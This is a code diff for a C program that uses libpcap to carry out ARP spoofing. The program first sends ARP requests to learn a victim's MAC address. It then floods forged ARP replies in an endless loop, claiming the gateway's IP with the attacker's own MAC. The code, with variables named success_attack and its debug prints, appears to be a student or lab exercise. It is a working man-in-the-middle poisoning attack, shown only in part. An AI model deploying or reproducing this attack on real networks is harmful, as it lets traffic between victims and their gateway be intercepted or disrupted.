@@ -126,7 +126,7 @@ int main(int argc, char *argv[])
     inet_pton(AF_INET,sender_ip,(*arprequest_arp).tpa); //targetip
 
     
-    unsigned char target_mac[6]={0xdd,0xdd,0xdd,0xdd,0xdd,0xdd};
+    unsigned char sender_mac[6]={0xdd,0xdd,0xdd,0xdd,0xdd,0xdd};
 
         /* Define the device */
         dev = pcap_lookupdev(errbuf);
@@ -157,9 +157,9 @@ int main(int argc, char *argv[])
         }
 
         
-      while(success_attack>=1)
+      while(success_attack<=10)
       {
-            printf("sending arp packet\n");
+            printf("sending arp packet to know sender mac\n");
             if(pcap_sendpacket(handle,send_packet_arprequest,42)!=0)
             {
                  printf("error\n");
@@ -183,30 +183,32 @@ int main(int argc, char *argv[])
                 {
                     if(!strcmp((*arp_to_know_targetmac).spa,sender_ip_data))
                     {
-                        memcpy(target_mac,(*arp_to_know_targetmac).sha,6);
+			printf("bug check");
+                        memcpy(sender_mac,(*arp_to_know_targetmac).sha,6);
 			success_attack++;
                     }
                 }
             }
             
 
+
+      }
+
+	while(1)
+	{
+	   printf("send attack arp packet");
            /* attack arp reply */
-            memcpy((*arpreply_eth).ether_dhost,target_mac,6);
+            memcpy((*arpreply_eth).ether_dhost,sender_mac,6);
             memcpy((*arpreply_eth).ether_shost,my_mac,6);       //my mac
             memcpy((*arpreply_arp).sha,my_mac,6);               //my mac
             inet_pton(AF_INET,target_ip,(*arpreply_arp).spa);   //sender ip - gateway
-            memcpy((*arpreply_arp).tha,target_mac,6);
+            memcpy((*arpreply_arp).tha,sender_mac,6);
             inet_pton(AF_INET,sender_ip,(*arpreply_arp).tpa);    //targetip
 
             if(pcap_sendpacket(handle,send_packet_arpreply,42)!=0)
             {
                 printf("error\n");
             }
-      }
-
-	while(1)
-	{
-		pcap_sendpacket(handle,send_packet_arpreply,42);
 	}
 
             pcap_close(handle);
